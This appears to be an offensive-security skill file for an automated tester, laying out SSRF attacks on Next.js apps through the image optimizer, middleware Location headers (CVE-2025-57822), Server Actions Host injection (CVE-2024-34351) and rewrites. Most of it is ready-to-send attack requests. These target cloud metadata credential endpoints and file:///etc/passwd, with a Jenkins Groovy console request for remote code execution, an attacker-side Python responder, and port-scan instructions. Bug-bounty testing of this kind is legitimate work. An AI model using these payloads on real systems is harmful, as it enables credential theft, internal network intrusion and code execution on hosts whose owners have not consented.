---
name: nextjs-ssrf
pattern: Next.js SSRF Attack Patterns
description: "Test Next.js applications for SSRF via image component, middleware Location header, Server Actions Host header injection, and rewrites proxy abuse"
triggers: ["/test-ssrf", "nextjs ssrf", "next.js ssrf", "/_next/image ssrf", "middleware ssrf", "CVE-2024-34351", "CVE-2025-57822", "server actions ssrf"]
tech: [nextjs, react, vercel, nodejs]
severity: High-Critical
related_patterns: [pdf-ssrf, ssrf-to-rce-chain, ssrf-redirect-loop-exfil, ssrf-protocol-smuggling-chain, origin-ip-discovery, open-redirect-chains]
sources: ["Intigriti blog — SSRF in Next.js targets", "CatFlix CTF writeup", "CVE-2024-34351", "CVE-2025-57822"]
---

# Next.js SSRF Attack Patterns

> Sources: Intigriti blog — SSRF in Next.js targets + CatFlix CTF writeup
> CVEs: CVE-2024-34351 (Server Actions), CVE-2025-57822 (Middleware)

## Crown Jewel Targets

- **Cloud metadata endpoints** (AWS IAM creds, GCP tokens, Azure managed identity) reachable via /_next/image or middleware SSRF
- **Internal Jenkins/Redis/Consul** on localhost ports reachable through middleware Location header chain to RCE
- **Server Actions redirect** on self-hosted Next.js <=14.1.1 exposing Host header SSRF to internal services
- **Wildcard image remotePatterns** (`hostname: '**'`) enabling full-read SSRF through image optimizer
- **Internal API endpoints** (`/api/internal`, `/api/admin`) accessible only from localhost, reachable via SSRF
- **Rewrite proxy misconfigurations** routing to internal backends with path traversal potential

## Attack Surface Signals

- `/_next/static/`, `/_next/data/`, `__NEXT_DATA__` in page source (confirms Next.js)
- `/_next/image?url=` endpoint exists (image optimizer active)
- `middleware.ts` presence indicated by custom response headers or UTM tracking behavior
- `X-Nextjs-*` headers, `x-middleware-*` headers in responses
- Server Actions forms with `action` attribute pointing to server endpoints
- `next.config.js` rewrites visible in `__NEXT_DATA__` or error messages
- Version fingerprint via `/_next/static/BUILD_ID` or `__NEXT_DATA__.buildId`

## 1. Image Component SSRF (`/_next/image`)

### Vulnerable Config
```javascript
// next.config.js — wildcard = SSRF
images: {
  remotePatterns: [
    { protocol: 'https', hostname: '**' },
    { protocol: 'http', hostname: '**' }
  ]
}
```

### Exploitation
```
GET /_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75
GET /_next/image?url=http://localhost:3000/api/internal&w=64&q=75
```

### Detection
- Probe `/_next/image?url=http://COLLAB_URL&w=64&q=75`
- Check if response contains fetched content or error leaks
- Image component **follows redirects** — chain with open redirect on whitelisted CDN

### Bypass Restricted Patterns
- Find open redirect on whitelisted hostname → chain through `/_next/image`
- `url=https://whitelisted-cdn.com/redirect?to=http://169.254.169.254/`

---

## 2. Middleware SSRF — CVE-2025-57822

### Root Cause
`NextResponse.next()` evaluates ALL headers from the incoming request, including `Location`. When middleware passes the request through, a crafted `Location` header makes Next.js fetch that URL server-side.

### Vulnerable Code Pattern
```typescript
// src/middleware.ts — ANY middleware using NextResponse.next()
export function middleware(request: NextRequest) {
  // Common triggers: UTM tracking, analytics, A/B testing
  if (request.nextUrl.searchParams.has('utm_source')) {
    // ... tracking logic ...
    return NextResponse.next(); // <-- evaluates Location header!
  }
  return NextResponse.next();
}
```

**Vulnerable line in Next.js source**: `packages/next/src/server/web/adapter.ts#L432`

### Basic SSRF PoC
```http
GET /?utm_source=meta HTTP/2
Host: target.com
Location: http://169.254.169.254/latest/meta-data/
```

Response body is replaced with the fetched content from the Location URL.

### Localhost Access
```http
GET /?utm_source=x HTTP/2
Host: target.com
Location: http://localhost:3000/
```

### Port Scanning via SSRF
```http
GET /?utm_source=x HTTP/2
Host: target.com
Location: http://localhost:8080/
```
Ffuf/Intruder on port number. Different response size = open port.

### SSRF to RCE (CatFlix chain)
1. Middleware SSRF → scan localhost ports
2. Found Jenkins on :8080 (no auth)
3. POST to Groovy script console:

```http
POST /?utm_source=meta HTTP/2
Host: target.com
Location: http://localhost:8080/script
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

script=println('id'.execute().text)
```

### Detection Checklist
- [ ] Does the app have middleware? (check for `middleware.ts` or custom headers)
- [ ] Send `Location: http://COLLAB/` header with any request
- [ ] Try with query params: `?utm_source=x`, `?ref=x`, `?campaign=x`
- [ ] Monitor Collaborator/interactsh for callbacks
- [ ] 5,000+ hosts estimated vulnerable (went unnoticed for years)

### Key Insight
Any `NextResponse.next()` call that processes user-controlled headers is vulnerable. The trigger doesn't have to be UTM — any middleware path that calls `next()` works.

---

## 3. Server Actions SSRF — CVE-2024-34351

### Requirements
- Next.js **<= 14.1.1**, self-hosted (not Vercel)
- App uses Server Actions with `redirect()` to relative path

### Attack Flow
1. Server Action calls `redirect('/dashboard')`
2. Next.js sends HEAD request to resolve the redirect — uses **Host header from incoming request**
3. Attacker sets `Host: attacker.com` → Next.js sends HEAD to attacker
4. Attacker responds to HEAD with valid `content-type`
5. Next.js sends GET → attacker responds with `302 Location: http://169.254.169.254/`
6. Next.js follows redirect, streams cloud metadata back to client

### Attacker Server Logic
```python
# Simplified OAST responder
if request.method == 'HEAD':
    return Response(headers={'Content-Type': 'text/x-component'})
elif request.method == 'GET':
    return Response(status=302, headers={
        'Location': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
    })
```

### Detection
- Identify Next.js version (view-source, `/_next/` paths, `__NEXT_DATA__`)
- Find Server Actions (form actions, `"use server"` directives)
- Test Host header injection: `Host: COLLAB_DOMAIN`
- Monitor for HEAD request callback

---

## 4. Rewrites/Redirects Abuse

### Vulnerable Config
```javascript
// next.config.js
async rewrites() {
  return [
    {
      source: '/api/:path*',
      destination: `${process.env.API_URL}/:path*`  // internal service
    }
  ]
}
```

### Exploitation
- If `API_URL` is internal (e.g., `http://backend:8080`), the rewrite proxies to internal services
- Path traversal in rewrite: `/api/../../admin/`
- Header injection through rewrite proxy

---

## 5. Quick Reference — Payloads

### Fingerprinting
```
/_next/static/chunks/
/_next/data/BUILD_ID/
/__nextjs_original-stack-frame
/_next/image?url=&w=1&q=1  (error reveals config)
```

### SSRF Targets (post-exploitation)
```
http://169.254.169.254/latest/meta-data/           # AWS
http://169.254.169.254/computeMetadata/v1/          # GCP (+ header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure
http://localhost:3000/api/                          # Next.js internal APIs
http://localhost:8080/                              # Common internal services
http://localhost:6379/                              # Redis
```

### Header Payloads (Middleware SSRF)
```
Location: http://169.254.169.254/latest/meta-data/
Location: http://localhost:8080/script
Location: http://internal-api.corp:8080/admin
Location: file:///etc/passwd
```

---

## 6. Bug Bounty Methodology

1. **Fingerprint**: Confirm Next.js (headers, `/_next/` paths, `__NEXT_DATA__`)
2. **Version check**: `/_next/static/BUILD_ID` → match to release
3. **Middleware probe**: Send `Location` header + UTM params on every endpoint
4. **Image SSRF**: Test `/_next/image?url=` with collaborator
5. **Server Actions**: Find forms with server actions, test Host header injection
6. **Port scan**: If SSRF confirmed, enumerate localhost ports (1-65535 via Intruder)
7. **Chain**: SSRF → internal service access → RCE (Jenkins, Redis, etc.)
8. **Evidence**: Raw HTTP requests in Burp, response showing internal data

### Impact Escalation
- SSRF alone = Medium/High
- SSRF + cloud metadata = High
- SSRF + RCE (Jenkins/Redis) = Critical
- SSRF + internal API access = depends on data exposed

---

## Operator Notes (Battle-Tested)

- **Middleware SSRF is the highest-ROI vector** — 5,000+ hosts estimated vulnerable, went unnoticed for years. Send `Location:` header on EVERY request to Next.js targets, not just UTM-triggered ones
- **Image optimizer follows redirects** — even with restricted `remotePatterns`, find an open redirect on ANY whitelisted hostname and chain through `/_next/image`
- **Server Actions SSRF requires self-hosted** — Vercel deployments are NOT vulnerable to CVE-2024-34351. Check deployment context before investing time
- **Version fingerprinting is critical** — `/_next/static/BUILD_ID` or `__NEXT_DATA__.buildId` maps to exact release. CVE-2024-34351 only affects <=14.1.1
- **Port scan via SSRF** — once middleware SSRF confirmed, use Burp Intruder on `Location: http://localhost:PORT/` with ports 1-65535 to map entire internal network
- **interactsh from minute 1** — inject callback URL in Location header on first request to confirm SSRF before deep testing

## Related Skills & Chains

| Situation | Pattern / Skill |
|-----------|----------------|
| SSRF confirmed, need RCE chain | `ssrf-to-rce-chain` |
| Blind SSRF, need response data | `ssrf-redirect-loop-exfil` |
| Internal Redis/Memcached reached | `ssrf-protocol-smuggling-chain` |
| PDF export feature found | `pdf-ssrf` |
| Open redirect found on CDN domain | `open-redirect-chains` |
| Origin IP needed to bypass WAF | `origin-ip-discovery` |
